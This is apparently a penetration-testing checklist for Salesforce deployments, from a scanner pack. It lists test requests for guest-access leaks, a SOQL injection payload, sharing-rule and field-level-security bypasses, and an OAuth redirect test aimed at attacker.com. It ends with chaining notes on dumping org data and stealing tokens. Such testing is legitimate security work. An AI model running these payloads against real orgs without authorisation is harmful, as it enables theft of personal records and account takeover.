# Salesforce — stack notes

Source: redscan pack (salesforce v1.0.0). Use when target uses Salesforce CRM, Community, or API.

## Fingerprinting

- Response header: `x-sfdc-request-id`
- Login: `login.salesforce.com` or `<instance>.my.salesforce.com`
- API base: `<instance>.salesforce.com/services/data/v<version>/`
- Community guest: `<domain>.force.com` or `<domain>.site.com`

## Critical invariants to test

### salesforce_community_guest_access (Critical)
Community guest profile must not reach internal org data.
```
# Without any auth (guest/anonymous):
GET https://<domain>.force.com/services/apexrest/<endpoint>
GET https://<instance>.salesforce.com/services/data/v55.0/query?q=SELECT+Id,Name+FROM+User
# Expect 401. If data returned → guest profile over-permissioned.
```

### salesforce_soql_injection (Critical)
Dynamic SOQL must use bind variables.
```
GET /services/data/v55.0/query?q=SELECT+Id+FROM+Contact+WHERE+Name='test'+OR+'1'='1'
# Or inject into app search fields that construct SOQL server-side.
# If extra records returned → SOQL injection confirmed.
```

### salesforce_sharing_rules (Critical)
Record-level sharing must prevent cross-account access.
```
# Get a record ID belonging to another account:
GET /services/data/v55.0/sobjects/Opportunity/<other_account_record_id>
Authorization: Bearer <your_token>
# Expect 403 or 404. If record returned → sharing rules not enforced.
```

### salesforce_field_level_security (High)
Restricted fields (SSN, salary, etc.) must be blocked by profile FLS.
```
GET /services/data/v55.0/sobjects/Contact/<id>?fields=SSN__c,Salary__c
Authorization: Bearer <low_priv_token>
# Expect null or field omitted. If value returned → FLS bypass.
```

### salesforce_apex_without_sharing (High)
Apex REST endpoints using `without sharing` bypass sharing rules.
```
POST /services/apexrest/<endpoint>
# Test operations that would normally respect sharing. If you can read/write
# records you shouldn't own → Apex without sharing exposed.
```

### salesforce_oauth_connected_app (High)
OAuth redirect_uri must be validated.
```
GET /services/oauth2/authorize?response_type=code&client_id=<connected_app_id>
  &redirect_uri=https://attacker.com
# Expect: error. If code delivered to attacker.com → open redirect → ATO.
```

## Key endpoints (sinks)

| Endpoint | Method | Key params |
|---|---|---|
| `/services/data/v{ver}/query` | GET | `q` (SOQL) |
| `/services/apexrest/<path>` | POST/GET | custom — check WSDL |
| `/services/oauth2/token` | POST | grant_type, client_id, client_secret, username, password |
| `/services/data/v{ver}/sobjects/<obj>/<id>` | GET/PATCH | record access |

## Misconfig patterns

- **My Domain not enabled** — login still via `login.salesforce.com` = session fixation risk.
- **Legacy API versions enabled** — SOAP requests to API v < 30 succeed = older endpoints active.
- **Debug logs with sensitive values** — `/tooling/query?q=SELECT+Body+FROM+ApexLog` returns PII in logs.

## Chaining notes

- Guest profile + SOQL injection = unauthenticated full org data dump
- Sharing rules bypass + field-level security bypass = complete record exfiltration
- Connected app open redirect + `response_type=token` implicit flow = token theft in fragment
- Apex without sharing + community guest access = elevation to internal record access as anonymous user
